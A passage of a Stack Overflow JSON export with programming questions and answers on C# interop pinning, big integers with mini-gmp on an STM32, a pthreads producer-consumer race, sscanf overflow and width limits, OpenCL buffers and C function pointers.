"https://www.gravatar.com/avatar/f52c02ef1784437c404e0c7719122b69?s=128&d=identicon&r=PG", "display_name": "IamIC", "link": "https://stackoverflow.com/users/401584/iamic"}, "reply_to_user": {"reputation": 870061, "user_id": 17034, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Cii6b.png?s=128&g=1", "display_name": "Hans Passant", "link": "https://stackoverflow.com/users/17034/hans-passant"}, "edited": false, "score": 0, "creation_date": 1524668118, "post_id": 50023961, "comment_id": 87066879, "body": "@HansPassant do you mean I don&#39;t need to use <code>GCHandle</code> but can simply pass the float and it will be auto pinned for me?"}, {"owner": {"reputation": 15695, "user_id": 682404, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxO2o.png?s=128&g=1", "display_name": "xxbbcc", "link": "https://stackoverflow.com/users/682404/xxbbcc"}, "edited": false, "score": 1, "creation_date": 1524668146, "post_id": 50023961, "comment_id": 87066906, "body": "@IamIC Yes, <code>GCHandle</code> is really the heavyweight way of doing this."}, {"owner": {"reputation": 16129, "user_id": 401584, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/f52c02ef1784437c404e0c7719122b69?s=128&d=identicon&r=PG", "display_name": "IamIC", "link": "https://stackoverflow.com/users/401584/iamic"}, "edited": false, "score": 0, "creation_date": 1524669089, "post_id": 50023961, "comment_id": 87067575, "body": "So, this? <code>unsafe static extern int Deduce(int pItems, int pParams, bool pEntropy, float[] pRank, float[] pWeight, float[] pResults);</code> Called: <code>Deduce(items_C, params_C, true, dist, weight, results)</code>"}, {"owner": {"reputation": 15695, "user_id": 682404, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxO2o.png?s=128&g=1", "display_name": "xxbbcc", "link": "https://stackoverflow.com/users/682404/xxbbcc"}, "edited": false, "score": 1, "creation_date": 1524670164, "post_id": 50023961, "comment_id": 87068368, "body": "@IamIC Yes, that looks about right. Make sure your arrays have the right number of elements when you pass them in."}, {"owner": {"reputation": 16129, "user_id": 401584, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/f52c02ef1784437c404e0c7719122b69?s=128&d=identicon&r=PG", "display_name": "IamIC", "link": "https://stackoverflow.com/users/401584/iamic"}, "edited": false, "score": 0, "creation_date": 1524670306, "post_id": 50023961, "comment_id": 87068471, "body": "The lengths are carefully managed. I tested and it&#39;s all working fine. Thanks much! I assume <code>GCHandle</code> is only needed if an array was passed into multiple managed functions."}], "owner": {"reputation": 16129, "user_id": 401584, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/f52c02ef1784437c404e0c7719122b69?s=128&d=identicon&r=PG", "display_name": "IamIC", "link": "https://stackoverflow.com/users/401584/iamic"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 59, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1524667091, "creation_date": 1524663868, "last_edit_date": 1524667091, "question_id": 50023961, "link": "https://stackoverflow.com/questions/50023961/c-maintain-type-safety-when-using-gchandle-to-pin-array-and-pass-to-c-function", "title": "C# maintain type safety when using GCHandle to pin array and pass to C function", "body": "<p>I have the following method signature:</p>\n\n<pre><code>[DllImport(\"CLibrary.dll\", EntryPoint = \"deduce\", CallingConvention = CallingConvention.Cdecl), SuppressUnmanagedCodeSecurity]\nunsafe static extern int Deduce(int pItems, int pParams, bool pEntropy, IntPtr pRank, IntPtr pWeight, IntPtr pResults);\n</code></pre>\n\n<p>C header:</p>\n\n<pre><code>__declspec(dllexport) int deduce(int p_items, int p_params, bool p_entropy, float* p_rank, float* p_weight, float* p_results)\n</code></pre>\n\n<p>I call the function as follows:</p>\n\n<pre><code>// dist, weight, results are float[]\nGCHandle p1 = GCHandle.Alloc(dist, GCHandleType.Pinned);\nGCHandle p2 = GCHandle.Alloc(weight, GCHandleType.Pinned);\nGCHandle p3 = GCHandle.Alloc(results, GCHandleType.Pinned);\n\nint ok = Deduce(items_C, params_C, true, p1.AddrOfPinnedObject(), p2.AddrOfPinnedObject(), p3.AddrOfPinnedObject());\n\np1.Free();\np2.Free();\np3.Free();\n</code></pre>\n\n<p>It works fine. What I don't like is that <code>dist</code>, <code>weight</code>, and <code>results</code> are no longer type safe. They're of type <code>float</code>.</p>\n\n<p>I can't see how to have type safety if I use the <code>GCHandle</code> approach (which is apparently the most efficient way of pinning).</p>\n\n<p>Is there a better option / way to maintain type safety?</p>\n"}, {"tags": ["c", "stm32", "mbed"], "comments": [{"owner": {"reputation": 10654, "user_id": 476048, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/dhByN.jpg?s=128&g=1", "display_name": "Berin Loritsch", "link": "https://stackoverflow.com/users/476048/berin-loritsch"}, "edited": false, "score": 0, "creation_date": 1524664344, "post_id": 50023939, "comment_id": 87064212, "body": "That number takes more than 16 bytes to represent, perhaps you are running into a rollover issue because the register is not large enough?  The Windows Calculator won&#39;t let me enter the full number to see it&#39;s representation in hex."}, {"owner": {"reputation": 10654, "user_id": 476048, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/dhByN.jpg?s=128&g=1", "display_name": "Berin Loritsch", "link": "https://stackoverflow.com/users/476048/berin-loritsch"}, "edited": false, "score": 0, "creation_date": 1524664570, "post_id": 50023939, "comment_id": 87064364, "body": "Essentially you&#39;d need 128 bits to store the number you are passing in, and your STM32F103 microcontroller is a 32 bit processor.  At best it will be able to work with 64 bit numbers.  You&#39;ll have to handle anything larger yourself."}, {"owner": {"reputation": 35, "user_id": 7757877, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0f05dfb55d704275beb4d36604a6f1c0?s=128&d=identicon&r=PG&f=1", "display_name": "namron", "link": "https://stackoverflow.com/users/7757877/namron"}, "reply_to_user": {"reputation": 10654, "user_id": 476048, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/dhByN.jpg?s=128&g=1", "display_name": "Berin Loritsch", "link": "https://stackoverflow.com/users/476048/berin-loritsch"}, "edited": false, "score": 0, "creation_date": 1524664865, "post_id": 50023939, "comment_id": 87064568, "body": "I thought that&#39;s what GMP is for"}], "answers": [{"comments": [{"owner": {"reputation": 35, "user_id": 7757877, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0f05dfb55d704275beb4d36604a6f1c0?s=128&d=identicon&r=PG&f=1", "display_name": "namron", "link": "https://stackoverflow.com/users/7757877/namron"}, "edited": false, "score": 0, "creation_date": 1524666462, "post_id": 50024367, "comment_id": 87065663, "body": "Exactly this! Thank you very much!"}], "tags": [], "owner": {"reputation": 6873, "user_id": 5131711, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z5oP7.png?s=128&g=1", "display_name": "followed Monica to Codidact", "link": "https://stackoverflow.com/users/5131711/followed-monica-to-codidact"}, "is_accepted": true, "score": 3, "last_activity_date": 1524665124, "creation_date": 1524665124, "answer_id": 50024367, "question_id": 50023939, "link": "https://stackoverflow.com/questions/50023939/serial-printf-running-gmp-on-stm32-with-mbed-framework/50024367#50024367", "title": "Serial printf running GMP on STM32 with mbed framework", "body": "<p>The prototype for <code>mpz_init_set_ui()</code> is</p>\n\n<pre><code>void mpz_init_set_ui (MP_INT *dest_integer, unsigned long int src_ulong);\n</code></pre>\n\n<p>It expects an <code>unsigned long</code> argument, which is 32 bits long on this platform. The C constant gets truncated to 32 bits <strong>before</strong> it's passed <code>to mpz_init_set_ui()</code>.</p>\n\n<p>11242342351435632235235464577 mod (2^32) = 3485947265, that is whay you have got.</p>\n\n<p>You should use a function that can initialize it with an arbitrary precision parameter, like <code>mpz_init_set_str()</code>.</p>\n"}], "owner": {"reputation": 35, "user_id": 7757877, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0f05dfb55d704275beb4d36604a6f1c0?s=128&d=identicon&r=PG&f=1", "display_name": "namron", "link": "https://stackoverflow.com/users/7757877/namron"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 213, "favorite_count": 0, "accepted_answer_id": 50024367, "answer_count": 1, "score": 0, "last_activity_date": 1524665124, "creation_date": 1524663821, "last_edit_date": 1524664175, "question_id": 50023939, "link": "https://stackoverflow.com/questions/50023939/serial-printf-running-gmp-on-stm32-with-mbed-framework", "title": "Serial printf running GMP on STM32 with mbed framework", "body": "<p>for a university project I'm working on a RSA-CRT implementation. I use <em>mini-gmp</em>, a subset of the GMP library for handling large integers.</p>\n\n<p>Goal of the project is to run the program on a STM32F103 microcontroller, which I want to use with the ARM mbed framework.</p>\n\n<p>Problem is I can't correctly print the large integers to the serial console for debugging. Here is a minimal working example of my code:</p>\n\n<pre><code>#include &lt;mbed.h&gt;\n#include &lt;mini-gmp.h&gt;\n\n//SETUP\nSerial pc(USBTX, USBRX); // enable serial communication, tx, rx\n\nint main(){\n\n  pc.baud (115200);\n  printf(\"STARTING\\n\\r\");\n\n  mpz_t n;\n  mpz_init_set_ui(n,11242342351435632235235464577);\n\n  mpz_out_str(stdout, 10, n);\n  printf(\"\\nFINISHED\\n\\r\");\n}\n</code></pre>\n\n<p>When compiling with PlatformIO and running on the microcontroller I get this in the serial console:</p>\n\n<pre><code>STARTING\n3485947265\nFINISHED \n</code></pre>\n\n<p>I noticed the printed number always being 10 digits long and starting with a 3, the rest of the digits vary with the value of <em>n</em>. So it doesn't look like some kind of overflow to me.</p>\n\n<p>Can someone here help me out? </p>\n"}, {"tags": ["c", "linux", "multithreading", "pthreads", "producer-consumer"], "comments": [{"owner": {"reputation": 2048, "user_id": 4961259, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/9b82c25cbde4d52888e6eccc44764b80?s=128&d=identicon&r=PG&f=1", "display_name": "Kami Kaze", "link": "https://stackoverflow.com/users/4961259/kami-kaze"}, "edited": false, "score": 1, "creation_date": 1524662662, "post_id": 50023380, "comment_id": 87063171, "body": "can you please be more specific with the problem?"}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1524665568, "post_id": 50023380, "comment_id": 87065047, "body": "Yeah - how can there be a synchro problem?  You create the PC queue, then the producer/consumers."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1524665791, "post_id": 50023380, "comment_id": 87065173, "body": "Also note: for a bounded PC queue that is safe for multiple producers/consumers, you need two semaphores and a mutex, (or three semaphores), or the equivalent condvars."}], "answers": [{"tags": [], "owner": {"reputation": 310760, "user_id": 12711, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c330bdee507c95c603a93ca91d9145a9?s=128&d=identicon&r=PG", "display_name": "Michael Burr", "link": "https://stackoverflow.com/users/12711/michael-burr"}, "is_accepted": true, "score": 0, "last_activity_date": 1524727510, "last_edit_date": 1524727510, "creation_date": 1524727146, "answer_id": 50037051, "question_id": 50023380, "link": "https://stackoverflow.com/questions/50023380/producer-consumer-using-semaphore-in-c/50037051#50037051", "title": "Producer-consumer using semaphore in C", "body": "<p>The problem is that your main thread runs to the point where it displays the data that the consumer thread is supposed to \"return\". But there's no synchronization between the main tread and the consumer.</p>\n\n<p>the easiest solution (that still uses threads) is to have the main thread join the consumer thread - that's how it can know the consumer has completed its work.  Instead of a call to sleep, try:</p>\n\n<pre><code>pthread_join(con_t, NULL);\n</code></pre>\n\n<p>You actually have a similar synchronization problem with the <code>producer()</code> thread, it's just that it's not apparent because you don't do anything with the data that the produce thread updates until after getting more input. So the race condition has plenty of time to complete in a way that produces the results you expect.</p>\n\n<p>However, keep in mind that your program isn't actually taking advantage of concurrency - it creates threads, but doesn't perform any significant work in parallel.  You might as well make direct calls to <code>producer()</code> and <code>consumer()</code>. </p>\n"}], "owner": {"reputation": 13, "user_id": 6516974, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/SE9Gl.jpg?s=128&g=1", "display_name": "Gaurang Rathod", "link": "https://stackoverflow.com/users/6516974/gaurang-rathod"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 11083, "favorite_count": 2, "accepted_answer_id": 50037051, "answer_count": 1, "score": -1, "last_activity_date": 1524727510, "creation_date": 1524662095, "last_edit_date": 1524726375, "question_id": 50023380, "link": "https://stackoverflow.com/questions/50023380/producer-consumer-using-semaphore-in-c", "title": "Producer-consumer using semaphore in C", "body": "<p>There is producer-consumer problem is written using semaphore. In below code, there is an issue of synchronization execution while the consumer is created. And for its solution, sleep statement is added in switch block of the consumer.<br> Kindly help me with the efficient solution for the synchronization. Any suggestion for the improvement of code is really helpful.</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;pthread.h&gt;\n#include&lt;unistd.h&gt;\n#include&lt;semaphore.h&gt; /* sem_t */\n#include&lt;stdlib.h&gt;\n\n#define BUF_SIZE 2\n\nstruct buffer {\n        int data;\n};\n\nstruct buffer buf[BUF_SIZE];\n\nsem_t fill, empty;\n\nint value, i;\n\nvoid *producer(void *data);\nvoid *consumer(void *data);\n\nint main(void)\n{\n    int sel, prod_data, cons_data;\n    int k;\n\n    if (sem_init(&amp;empty, 0, BUF_SIZE)) {\n        printf(\"Error: semaphore not initialize\\n\");\n        return -1;\n    }\n    if (sem_init(&amp;fill, 0, 0)) {\n        printf(\"Error: semaphore not initialize\\n\");\n        return -1;\n    }\n\n    while (1) {\n        printf(\".........................................................\\n\");\n        printf(\"Selection\\n\");\n        printf(\"Producer : 1 | Consumer : 2 | Display : 3 | Exit : 0 || \");\n        scanf(\"%d\",&amp;sel);\n        printf(\".........................................................\\n\");\n\n        switch (sel) {\n        case 1:\n            sem_getvalue(&amp;empty, &amp;value);\n//          printf(\"Prod_e: %d\\n\", value);\n            sem_getvalue(&amp;fill, &amp;value);\n//          printf(\"Prod_f: %d\\n\", value);\n            printf(\"\\nProducer\\n\");\n            pthread_t prod_t;\n            printf(\"Enter data:\");\n            scanf(\"%d\", &amp;prod_data);\n            if (pthread_create(&amp;prod_t, NULL, producer, (void *) &amp;prod_data)) {\n                printf(\"Error: thread not created\\n\");\n                return -1;\n            }\n            break;\n        case 2:\n            printf(\"\\nConsumer\\n\");\n            sem_getvalue(&amp;empty, &amp;value);\n//          printf(\"Cons_e: %d\\n\", value);\n            sem_getvalue(&amp;fill, &amp;value);\n//          printf(\"Cons_f: %d\\n\", value);\n            pthread_t con_t;\n            if (pthread_create(&amp;con_t, NULL, consumer, (void *) &amp;cons_data)) {\n                printf(\"Error: thread not created\\n\");\n                return -1;\n            }\n            if (i == 0) {\n                printf(\"Buffer empty\\n\");\n                break;\n            }\n//              sleep(1); // if commented then synchronization issue\n            printf(\"Consume data: %d\\n\", cons_data);\n            break;\n        case 3:\n                if (i == 0) {\n                    printf(\"Buffer empty\\n\");\n                    break;\n                }\n                for (k = 0; k &lt; i; k++)\n                    printf(\"buf[%d]: %d\\n\", k, buf[k].data);\n                break;\n        case 0:\n            sem_destroy(&amp;fill);\n            sem_destroy(&amp;empty);\n            exit (0);\n            break;\n        }\n    }\n    sem_destroy(&amp;fill);\n    sem_destroy(&amp;empty);\n    return 0;\n}\n\nvoid *producer(void *arg)\n{\n    int data = *(int *) arg;\n\n    if (sem_wait(&amp;empty)) { /* wait */\n        printf(\"Error: sem wait fail\\n\");\n        pthread_exit(NULL);\n    }\n\n    buf[i].data = data;\n    i++;\n\n    if (sem_post(&amp;fill)) { /* post */\n        printf(\"Error: sem wait fail\\n\");\n        pthread_exit(NULL);\n    }\n\n    pthread_exit(NULL);\n}\n\nvoid *consumer(void *arg)\n{\n\n    if (sem_wait(&amp;fill)) { /* wait */\n        printf(\"Error: sem wait fail\\n\");\n        pthread_exit(NULL);\n    }\n\n    i--;\n    *(int *) arg = buf[i].data;\n\n    if (sem_post(&amp;empty)) { /* post */\n        printf(\"Error: sem wait fail\\n\");\n        pthread_exit(NULL);\n    }\n    pthread_exit(NULL);\n}\n</code></pre>\n\n<p><br>\nOutput without sleep statement:<br></p>\n\n<pre><code>Selection\nProducer : 1 | Consumer : 2 | Display : 3 | Exit : 0 || 1\n\nProducer\nEnter data: 11\n\nSelection\nProducer : 1 | Consumer : 2 | Display : 3 | Exit : 0 || 3\n\nDisplay\nbuf[0] = 11\n\nSelection\nProducer : 1 | Consumer : 2 | Display : 3 | Exit : 0 || 2\n\nConsumer\nConsume data: 4196464\n</code></pre>\n\n<p>If sleep statement is added in consumer block then expected output(in our case 11) is obtain. <br>Due to sleep statement insertion, consumer thread get enough time to complete its execution compared to case 2 statements of switch and provide expected output.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 10774, "user_id": 4419802, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7d0f1bd19b8b8481b6b3e812691c1ccb?s=128&d=identicon&r=PG", "display_name": "Matt", "link": "https://stackoverflow.com/users/4419802/matt"}, "edited": false, "score": 1, "creation_date": 1524661583, "post_id": 50023128, "comment_id": 87062369, "body": "12 bln. doesn&#39;t fit in 4 bytes"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 2, "creation_date": 1524661612, "post_id": 50023128, "comment_id": 87062385, "body": "Just for the records: a <code>scanf()</code> format string is <b>not</b> a regular expression."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 1, "creation_date": 1524661893, "post_id": 50023128, "comment_id": 87062586, "body": "I assume in your final code, the input won&#39;t be hardcoded, so <code>%[^=]</code> is a <b>buffer overflow waiting to be exploited</b> -- use <code>%19[^=]</code>."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1524662483, "post_id": 50023128, "comment_id": 87063028, "body": "I&#39;d drop <code>sscanf</code> alltogether, parse the string myself and use <a href=\"http://en.cppreference.com/w/c/string/byte/strtol\" rel=\"nofollow noreferrer\"><code>strtoll</code></a> to convert the strings to numbers."}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 2, "creation_date": 1524661770, "post_id": 50023199, "comment_id": 87062505, "body": "Which is btw one of the many reasons not to use <code>scanf()</code> in the first place: No way to detect this reliably. But that&#39;s out of scope here, so, good answer."}, {"owner": {"reputation": 2832, "user_id": 1410376, "user_type": "registered", "accept_rate": 48, "profile_image": "https://i.stack.imgur.com/3aMQc.jpg?s=128&g=1", "display_name": "Anis_Stack", "link": "https://stackoverflow.com/users/1410376/anis-stack"}, "edited": false, "score": 0, "creation_date": 1524664900, "post_id": 50023199, "comment_id": 87064591, "body": "@Dan I changed the variable type to long long but I cant not get the right value of the number !!"}, {"owner": {"reputation": 3355, "user_id": 4114447, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/aa93321ad023953eaaae28b490855e7a?s=128&d=identicon&r=PG&f=1", "display_name": "Dan M.", "link": "https://stackoverflow.com/users/4114447/dan-m"}, "reply_to_user": {"reputation": 2832, "user_id": 1410376, "user_type": "registered", "accept_rate": 48, "profile_image": "https://i.stack.imgur.com/3aMQc.jpg?s=128&g=1", "display_name": "Anis_Stack", "link": "https://stackoverflow.com/users/1410376/anis-stack"}, "edited": false, "score": 0, "creation_date": 1524665455, "post_id": 50023199, "comment_id": 87064970, "body": "@Anis_Stack because you also need to change your format string to <code>&quot;%[^=]=%lld&quot;</code> and in <code>printf</code> too (<code>&quot; name = %s id=%lld\\n&quot;</code>)."}], "tags": [], "owner": {"reputation": 3355, "user_id": 4114447, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/aa93321ad023953eaaae28b490855e7a?s=128&d=identicon&r=PG&f=1", "display_name": "Dan M.", "link": "https://stackoverflow.com/users/4114447/dan-m"}, "is_accepted": true, "score": 4, "last_activity_date": 1524661585, "creation_date": 1524661585, "answer_id": 50023199, "question_id": 50023128, "link": "https://stackoverflow.com/questions/50023128/c-extract-number-from-a-string/50023199#50023199", "title": "C extract number from a string", "body": "<p><code>12544787844</code> doesn't fit into <code>int</code> since it's bigger than <code>INT_MAX</code> (so you get an overflow). Use <code>long long</code> with <code>%lld</code> format string.</p>\n"}, {"tags": [], "owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "is_accepted": false, "score": 0, "last_activity_date": 1524765807, "creation_date": 1524765807, "answer_id": 50049402, "question_id": 50023128, "link": "https://stackoverflow.com/questions/50023128/c-extract-number-from-a-string/50049402#50049402", "title": "C extract number from a string", "body": "<p>The posted code contains a few problems, as covered in the comments to the question.</p>\n\n<p>The following proposed code:</p>\n\n<ol>\n<li>properly formats the 'format string for the call to `sscanf()</li>\n<li>properly declares the ID variable to be large enough to hold the ID</li>\n<li>properly checks for errors</li>\n<li>indents the code for readability</li>\n<li>for your assistance, documents why each header file is included</li>\n<li>eliminates the 'magic' number by giving it a meaningful name</li>\n<li>notice the <code>;123</code> is never input</li>\n</ol>\n\n<p>And now, the proposed code</p>\n\n<pre><code>#include &lt;stdio.h&gt;  // sscanf(), sprintf()\n#include &lt;stdlib.h&gt; // exit(), EXIT_FAILURE\n\n#define MAX_NAME_LEN 20\n\nint main( void )\n{\n    char name[ MAX_NAME_LEN +1 ];\n    long long int id;\n\n    char format[20];\n    sprintf( format, \"%%%d[^=]=%%lld\", MAX_NAME_LEN );\n\n    int status = sscanf(\"tabid=12544787844;123\", format, name, &amp;id);\n    if( status != 2 )\n    {\n        fprintf( stderr, \"sscanf failed to extract the two fields\\n\" );\n        exit( EXIT_FAILURE );\n    }\n\n    // implied else, sscanf successful\n\n    printf(\" name = %s id=%lld\\n\", name ,id);\n    // by convention:\n    // returning 0 indicates success,\n    // returning 1 indicates a failure\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 2832, "user_id": 1410376, "user_type": "registered", "accept_rate": 48, "profile_image": "https://i.stack.imgur.com/3aMQc.jpg?s=128&g=1", "display_name": "Anis_Stack", "link": "https://stackoverflow.com/users/1410376/anis-stack"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 209, "favorite_count": 0, "accepted_answer_id": 50023199, "answer_count": 2, "score": 1, "last_activity_date": 1524765807, "creation_date": 1524661393, "question_id": 50023128, "link": "https://stackoverflow.com/questions/50023128/c-extract-number-from-a-string", "title": "C extract number from a string", "body": "<p>I would like to extract a number from string using sscanf.</p>\n\n<p>the number is between \"=\" and \";\"</p>\n\n<pre><code> #include &lt;stdio.h&gt;\n\n    int main() {\n      char name[20];\n      int id;\n      sscanf(\"tabid=12544787844;123\", \"%[^=]=%d\", name, &amp;id);\n      printf(\" name = %s id=%d\\n\", name ,id);\n      return 1;\n    }\n</code></pre>\n\n<p>i got the following result :</p>\n\n<blockquote>\n  <p>name = tabid id=-340114044</p>\n</blockquote>\n\n<p>what is wrong with the regular expression of sscanf </p>\n"}, {"tags": ["c", "opencl"], "answers": [{"comments": [{"owner": {"reputation": 303, "user_id": 8030794, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/047137955485cadbfbc49cf82b9c83eb?s=128&d=identicon&r=PG&f=1", "display_name": "Fresto", "link": "https://stackoverflow.com/users/8030794/fresto"}, "edited": false, "score": 0, "creation_date": 1524665644, "post_id": 50024393, "comment_id": 87065089, "body": "Thanks a lot, i will do so"}], "tags": [], "owner": {"reputation": 622, "user_id": 5121373, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/682a61eacb08098831bb8a0e1bdbd9b0?s=128&d=identicon&r=PG&f=1", "display_name": "Tu\u1ea5n Ph\u1ea1m", "link": "https://stackoverflow.com/users/5121373/tu%e1%ba%a5n-ph%e1%ba%a1m"}, "is_accepted": true, "score": 1, "last_activity_date": 1524665202, "creation_date": 1524665202, "answer_id": 50024393, "question_id": 50023086, "link": "https://stackoverflow.com/questions/50023086/how-to-create-dynamic-array-in-opencl/50024393#50024393", "title": "How to create dynamic array in OpenCL?", "body": "<p>Yes, you have to create a buffer of 1mil*1000, at least thats what i experienced.</p>\n"}], "owner": {"reputation": 303, "user_id": 8030794, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/047137955485cadbfbc49cf82b9c83eb?s=128&d=identicon&r=PG&f=1", "display_name": "Fresto", "link": "https://stackoverflow.com/users/8030794/fresto"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 46, "favorite_count": 0, "closed_date": 1524668296, "accepted_answer_id": 50024393, "answer_count": 1, "score": 0, "last_activity_date": 1524665202, "creation_date": 1524661282, "question_id": 50023086, "link": "https://stackoverflow.com/questions/50023086/how-to-create-dynamic-array-in-opencl", "closed_reason": "Needs more focus", "title": "How to create dynamic array in OpenCL?", "body": "<p>I need to run kernel function 1 million times. In each core i need to create dynamic array of 1000 elements. How i can resolve this problem? Should i create buffer of 1 million * 1000 elements and contact them using id,but it's a lot of memory, and i haven't as much? Or is there another resolve?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 915, "user_id": 3254536, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/c4d61200a78c3d51c929553f2a3c5de8?s=128&d=identicon&r=PG&f=1", "display_name": "Neijwiert", "link": "https://stackoverflow.com/users/3254536/neijwiert"}, "edited": false, "score": 0, "creation_date": 1524659809, "post_id": 50022521, "comment_id": 87061006, "body": "Because you get the address of the function. Invoking functions in assembly language is nothing but jumping to the function address and continueing from there.."}, {"owner": {"reputation": 155, "user_id": 5622844, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e935f40ea1116eea47d4934fcc9870c0?s=128&d=identicon&r=PG", "display_name": "NaCl", "link": "https://stackoverflow.com/users/5622844/nacl"}, "reply_to_user": {"reputation": 915, "user_id": 3254536, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/c4d61200a78c3d51c929553f2a3c5de8?s=128&d=identicon&r=PG&f=1", "display_name": "Neijwiert", "link": "https://stackoverflow.com/users/3254536/neijwiert"}, "edited": false, "score": 0, "creation_date": 1524659873, "post_id": 50022521, "comment_id": 87061056, "body": "@Neijwiert I think he meant: <code>addressof(Function) != addressof(&amp;Function)</code> but the left is just sugar for the right."}, {"owner": {"reputation": 915, "user_id": 3254536, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/c4d61200a78c3d51c929553f2a3c5de8?s=128&d=identicon&r=PG&f=1", "display_name": "Neijwiert", "link": "https://stackoverflow.com/users/3254536/neijwiert"}, "reply_to_user": {"reputation": 155, "user_id": 5622844, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e935f40ea1116eea47d4934fcc9870c0?s=128&d=identicon&r=PG", "display_name": "NaCl", "link": "https://stackoverflow.com/users/5622844/nacl"}, "edited": false, "score": 1, "creation_date": 1524660076, "post_id": 50022521, "comment_id": 87061217, "body": "@NaCl Oh I see, then I misread the question."}, {"owner": {"reputation": 155, "user_id": 5622844, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e935f40ea1116eea47d4934fcc9870c0?s=128&d=identicon&r=PG", "display_name": "NaCl", "link": "https://stackoverflow.com/users/5622844/nacl"}, "edited": false, "score": 0, "creation_date": 1524660275, "post_id": 50022521, "comment_id": 87061359, "body": "For op: the last declaration of your function pointer is: <code>int (*p)(int)</code> which is not the same as <code>void f(int)</code>, note the return type, <b><i>pretty strict C code</i></b>  would not allow this kind of stuff."}, {"owner": {"reputation": 367, "user_id": 9212698, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/29c50f4cbd6c2a78485c51bcb7f50a3d?s=128&d=identicon&r=PG&f=1", "display_name": "Zahra19977", "link": "https://stackoverflow.com/users/9212698/zahra19977"}, "reply_to_user": {"reputation": 155, "user_id": 5622844, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e935f40ea1116eea47d4934fcc9870c0?s=128&d=identicon&r=PG", "display_name": "NaCl", "link": "https://stackoverflow.com/users/5622844/nacl"}, "edited": false, "score": 0, "creation_date": 1524660722, "post_id": 50022521, "comment_id": 87061690, "body": "@NaCl yes i maked mistake...i edited"}], "owner": {"reputation": 367, "user_id": 9212698, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/29c50f4cbd6c2a78485c51bcb7f50a3d?s=128&d=identicon&r=PG&f=1", "display_name": "Zahra19977", "link": "https://stackoverflow.com/users/9212698/zahra19977"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 90, "favorite_count": 0, "closed_date": 1524659830, "answer_count": 0, "score": 1, "last_activity_date": 1524660662, "creation_date": 1524659699, "last_edit_date": 1524660662, "question_id": 50022521, "link": "https://stackoverflow.com/questions/50022521/function-name-with-ampersand-operator-in-c", "closed_reason": "Duplicate", "title": "Function name with ampersand operator in c", "body": "<p>If a function name is a pointer to itself, why is the function name with <code>&amp;</code> operator also an address of the function? Is it not the address of pointer to the function?</p>\n\n<pre><code> void f(int a);\n\n    // ....\n    